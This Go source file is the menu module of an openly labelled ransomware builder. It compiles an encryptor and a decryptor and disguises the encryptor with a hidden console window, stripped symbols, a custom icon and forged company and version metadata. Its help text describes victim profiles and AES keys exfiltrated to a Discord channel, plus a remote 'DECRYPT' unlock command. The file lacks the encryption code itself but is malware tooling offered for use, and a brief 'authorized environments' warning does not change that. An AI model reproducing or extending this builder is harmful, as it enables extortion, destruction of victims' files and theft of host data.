package ransomware

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
	"programa/utils"
	"runtime"
	"strings"
)

const (
	imgPath = "./img/"
)

func LaunchRansomware() {
	for {
		utils.ClearTerminal()
		showRansomwareMenu()

		reader := bufio.NewReader(os.Stdin)
		fmt.Printf("%sChoose an option: %s", utils.Green, utils.Reset)
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(input)

		switch input {
		case "1":
			buildEncryptor()
		case "2":
			buildDecryptor()
		case "3":
			showRecoveryHelp()
		case "4":
			return
		default:
			fmt.Printf("%sInvalid option!%s\n", utils.Red, utils.Reset)
			utils.PauseForInput()
		}
	}
}

func showRansomwareMenu() {
	fmt.Printf("\n%s╔═══════════════════════════════════════════════════════════════╗%s\n", utils.Purple, utils.Reset)
	fmt.Printf("%s║              RANSOMWARE BUILDER                               ║%s\n", utils.Purple, utils.Reset)
	fmt.Printf("%s╚═══════════════════════════════════════════════════════════════╝%s\n\n", utils.Purple, utils.Reset)

	fmt.Printf("%s  [1] Build Encryptor%s\n", utils.Green, utils.Reset)
	fmt.Printf("%s  [2] Build Decryptor%s\n", utils.Blue, utils.Reset)
	fmt.Printf("%s  [3] How recovery works (Discord + local key)%s\n", utils.Yellow, utils.Reset)
	utils.PrintReturnOption("4")
}

func showRecoveryHelp() {
	utils.ClearTerminal()
	fmt.Printf("\n%s═══ RECOVERY (AUTHORIZED / LAB USE) ═══%s\n\n", utils.Blue, utils.Reset)
	const body = `
Discord (two embeds per victim)
  1) First message: host profile, users, ports, spoiler-wrapped AES hex (64 chars).
  2) After the disk pass: file count, plaintext bytes, duration, extension breakdown.

The "encryption" and "decryption" key are the same value (symmetric AES-256-GCM).

Remote unlock — in the victim channel, post:
  DECRYPT <paste_the_full_hex>

  Matching is case-insensitive on the word DECRYPT; the hex must match exactly.

Local unlock — run the decryptor you built with [2]:
  decrypt.exe <full_hex>
  (or on Linux: ./decrypt <full_hex>)

  If you omit the argument, it reads the key file written by the encryptor:
    Windows: %APPDATA%\decryption_key.txt
    Linux:   /tmp/.decryption_key

Build note: the encryptor binary must include decrypt logic so the bot can
trigger DecryptSystem() from Discord; the standalone decryptor is only for
manual/air-gapped recovery.
`
	fmt.Print(body)
	fmt.Println()
	utils.PauseForInput()
}

func buildEncryptor() {
	utils.ClearTerminal()
	fmt.Printf("\n%s═══ BUILD ENCRYPTOR ═══%s\n\n", utils.Red, utils.Reset)

	reader := bufio.NewReader(os.Stdin)

	fmt.Printf("%sOutput filename (default: ransomware.exe): %s", utils.Green, utils.Reset)
	filename, _ := reader.ReadString('\n')
	filename = strings.TrimSpace(filename)
	if filename == "" {
		filename = "ransomware.exe"
	}
	if !strings.HasSuffix(filename, ".exe") && runtime.GOOS == "windows" {
		filename += ".exe"
	}

	fmt.Printf("\n%sSelect image/icon (optional):%s\n", utils.Yellow, utils.Reset)
	icon := selectIcon(reader)

	fmt.Printf("\n%sObfuscate code? (y/n): %s", utils.Yellow, utils.Reset)
	obfuscate, _ := reader.ReadString('\n')
	obfuscate = strings.ToLower(strings.TrimSpace(obfuscate))

	fmt.Printf("\n%sEmbed file information? (y/n): %s", utils.Yellow, utils.Reset)
	embedInfo, _ := reader.ReadString('\n')
	embedInfo = strings.ToLower(strings.TrimSpace(embedInfo))

	var fileDescription, companyName, productVersion string
	if embedInfo == "y" || embedInfo == "yes" {
		fmt.Printf("%sFile Description: %s", utils.Green, utils.Reset)
		fileDescription, _ = reader.ReadString('\n')
		fileDescription = strings.TrimSpace(fileDescription)

		fmt.Printf("%sCompany Name: %s", utils.Green, utils.Reset)
		companyName, _ = reader.ReadString('\n')
		companyName = strings.TrimSpace(companyName)

		fmt.Printf("%sProduct Version: %s", utils.Green, utils.Reset)
		productVersion, _ = reader.ReadString('\n')
		productVersion = strings.TrimSpace(productVersion)
	}

	fmt.Printf("\n%s[*] Building encryptor...%s\n", utils.Yellow, utils.Reset)

	buildArgs := []string{"build"}

	if runtime.GOOS == "windows" {
		buildArgs = append(buildArgs, "-ldflags", "-H=windowsgui")
	}

	buildArgs = append(buildArgs, "-o", filename)

	if obfuscate == "y" || obfuscate == "yes" {
		fmt.Printf("%s[*] Obfuscating code...%s\n", utils.Yellow, utils.Reset)
		buildArgs = append(buildArgs, "-trimpath", "-ldflags", "-s -w")
	}

	tempMainContent := `package ransomware

func main() {
	initializeEncryption()
}
`
	tempMainFile := "_main_wrapper.go"
	err := os.WriteFile(tempMainFile, []byte(tempMainContent), 0644)
	if err != nil {
		fmt.Printf("%s[!] Failed to create build wrapper: %v%s\n", utils.Red, err, utils.Reset)
		utils.PauseForInput()
		return
	}
	defer os.Remove(tempMainFile)

	// Use relative path from project root: ./scripts/ransomware/
	buildArgs = append(buildArgs, "./scripts/ransomware/config.go", "./scripts/ransomware/encrypt.go", "./scripts/ransomware/decrypt.go", "./scripts/ransomware/discord.go", "./scripts/ransomware/"+tempMainFile)

	cmd := exec.Command("go", buildArgs...)
	output, err := cmd.CombinedOutput()

	if err != nil {
		fmt.Printf("%s[!] Build failed:%s\n%s\n", utils.Red, utils.Reset, string(output))
		utils.PauseForInput()
		return
	}

	if icon != "" && runtime.GOOS == "windows" {
		fmt.Printf("%s[*] Applying icon with rsrc...%s\n", utils.Yellow, utils.Reset)
		if err := applyIconWithRsrc(filename, icon); err != nil {
			fmt.Printf("%s[!] Failed to apply icon: %v%s\n", utils.Red, err, utils.Reset)
		}
	}

	if embedInfo == "y" || embedInfo == "yes" {
		fmt.Printf("%s[*] Embedding file information...%s\n", utils.Yellow, utils.Reset)
		embedFileInfo(filename, fileDescription, companyName, productVersion)
	}

	fmt.Printf("\n%s[✓] Encryptor built successfully: %s%s\n", utils.Green, filename, utils.Reset)
	fmt.Printf("%s[!] WARNING: Use only in authorized environments!%s\n", utils.Red, utils.Reset)
	utils.PauseForInput()
}

func buildDecryptor() {
	utils.ClearTerminal()
	fmt.Printf("\n%s═══ BUILD DECRYPTOR ═══%s\n\n", utils.Blue, utils.Reset)

	reader := bufio.NewReader(os.Stdin)

	fmt.Printf("%sOutput filename (default: decrypt.exe): %s", utils.Green, utils.Reset)
	filename, _ := reader.ReadString('\n')
	filename = strings.TrimSpace(filename)
	if filename == "" {
		filename = "decrypt.exe"
	}
	if !strings.HasSuffix(filename, ".exe") && runtime.GOOS == "windows" {
		filename += ".exe"
	}

	fmt.Printf("\n%sSelect image/icon (optional):%s\n", utils.Yellow, utils.Reset)
	icon := selectIcon(reader)

	fmt.Printf("\n%s[*] Building decryptor...%s\n", utils.Yellow, utils.Reset)

	tempMainContent := `package ransomware

func main() {
	DecryptSystem()
}
`
	tempMainFile := "_main_wrapper.go"
	err := os.WriteFile(tempMainFile, []byte(tempMainContent), 0644)
	if err != nil {
		fmt.Printf("%s[!] Failed to create build wrapper: %v%s\n", utils.Red, err, utils.Reset)
		utils.PauseForInput()
		return
	}
	defer os.Remove(tempMainFile)

	// Use relative path from project root: ./scripts/ransomware/
	buildArgs := []string{"build", "-o", filename, "./scripts/ransomware/config.go", "./scripts/ransomware/decrypt.go", "./scripts/ransomware/" + tempMainFile}

	cmd := exec.Command("go", buildArgs...)
	output, err := cmd.CombinedOutput()

	if err != nil {
		fmt.Printf("%s[!] Build failed:%s\n%s\n", utils.Red, utils.Reset, string(output))
		utils.PauseForInput()
		return
	}

	if icon != "" && runtime.GOOS == "windows" {
		fmt.Printf("%s[*] Applying icon with rsrc...%s\n", utils.Yellow, utils.Reset)
		if err := applyIconWithRsrc(filename, icon); err != nil {
			fmt.Printf("%s[!] Failed to apply icon: %v%s\n", utils.Red, err, utils.Reset)
		}
	}

	fmt.Printf("\n%s[✓] Decryptor built successfully: %s%s\n", utils.Green, filename, utils.Reset)
	utils.PauseForInput()
}

func selectIcon(reader *bufio.Reader) string {
	return utils.SelectIconImage(reader, imgPath)
}

func ensureRsrcInstalled() error {

	_, err := exec.LookPath("rsrc")
	if err == nil {
		return nil
	}

	fmt.Printf("%s[*] Installing rsrc tool...%s\n", utils.Yellow, utils.Reset)

	cmd := exec.Command("go", "install", "github.com/akavel/rsrc@latest")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("failed to install rsrc: %v\nOutput: %s", err, string(output))
	}

	_, err = exec.LookPath("rsrc")
	if err != nil {
		return fmt.Errorf("rsrc installed but not found in PATH. Make sure GOPATH/bin is in your PATH")
	}

	fmt.Printf("%s[✓] rsrc tool installed successfully%s\n", utils.Green, utils.Reset)
	return nil
}

func applyIconWithRsrc(exePath, imagePath string) error {
	if runtime.GOOS != "windows" {
		fmt.Printf("%s[!] rsrc icon embedding only supported on Windows%s\n", utils.Yellow, utils.Reset)
		return nil
	}

	if err := ensureRsrcInstalled(); err != nil {
		return fmt.Errorf("failed to ensure rsrc is installed: %v", err)
	}

	icoPath, cleanupIco, err := utils.MaterializeICO(imagePath)
	if err != nil {
		return err
	}
	defer cleanupIco()

	sysoPath := "resource.syso"

	cmd := exec.Command("rsrc",
		"-arch", "amd64",
		"-ico", icoPath,
		"-o", sysoPath)

	fmt.Printf("%s[*] Running rsrc: %s%s\n", utils.Yellow, strings.Join(cmd.Args, " "), utils.Reset)

	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("rsrc command failed: %v\nOutput: %s", err, string(output))
	}

	if _, err := os.Stat(sysoPath); err != nil {
		return fmt.Errorf("rsrc failed to create .syso file")
	}

	fmt.Printf("%s[✓] Created resource.syso%s\n", utils.Green, utils.Reset)

	fmt.Printf("%s[*] Rebuilding executable with embedded resource...%s\n", utils.Yellow, utils.Reset)

	exeNameNoExt := strings.TrimSuffix(exePath, ".exe")
	buildArgs := []string{"build", "-o", exePath}

	if runtime.GOOS == "windows" {
		buildArgs = append(buildArgs, "-ldflags", "-H=windowsgui")
	}

	var sourceFile string
	switch exeNameNoExt {
	case "ransomware":
		sourceFile = "encrypt.go"
	case "decrypt":
		sourceFile = "decrypt.go"
	default:

		sourceFile = exeNameNoExt + ".go"
	}

	buildArgs = append(buildArgs, sourceFile)

	cmd = exec.Command("go", buildArgs...)
	output, err = cmd.CombinedOutput()

	defer func() {
		if err := os.Remove(sysoPath); err == nil {
			fmt.Printf("%s[✓] Cleaned up resource.syso%s\n", utils.Green, utils.Reset)
		}
	}()

	if err != nil {
		return fmt.Errorf("failed to rebuild executable: %v\nOutput: %s", err, string(output))
	}

	fmt.Printf("%s[✓] Icon applied and executable built%s\n", utils.Green, utils.Reset)
	return nil
}

func applyIcon(exePath, iconPath string) {

	if err := applyIconWithRsrc(exePath, iconPath); err != nil {
		fmt.Printf("%s[!] Error: %v%s\n", utils.Red, err, utils.Reset)
	}
}

func embedFileInfo(exePath, description, company, version string) {
	if runtime.GOOS != "windows" {
		fmt.Printf("%s[!] File info embedding only supported on Windows%s\n", utils.Yellow, utils.Reset)
		return
	}

	versionInfo := fmt.Sprintf(`
1 VERSIONINFO
FILEVERSION 1,0,0,0
PRODUCTVERSION 1,0,0,0
BEGIN
  BLOCK "StringFileInfo"
  BEGIN
    BLOCK "040904E4"
    BEGIN
      VALUE "CompanyName", "%s"
      VALUE "FileDescription", "%s"
      VALUE "FileVersion", "%s"
      VALUE "ProductName", "%s"
      VALUE "ProductVersion", "%s"
    END
  END
  BLOCK "VarFileInfo"
  BEGIN
    VALUE "Translation", 0x409, 1252
  END
END
`, company, description, version, description, version)

	rcFile := exePath + ".rc"
	resFile := exePath + ".res"

	err := os.WriteFile(rcFile, []byte(versionInfo), 0644)
	if err != nil {
		fmt.Printf("%s[!] Failed to create resource file%s\n", utils.Red, utils.Reset)
		return
	}
	defer os.Remove(rcFile)

	cmd := exec.Command("windres", rcFile, "-O", "coff", "-o", resFile)
	err = cmd.Run()
	if err != nil {
		fmt.Printf("%s[!] windres not found. Install MinGW to embed file info.%s\n", utils.Yellow, utils.Reset)
		return
	}
	defer os.Remove(resFile)

	fmt.Printf("%s[✓] File info embedded%s\n", utils.Green, utils.Reset)
}
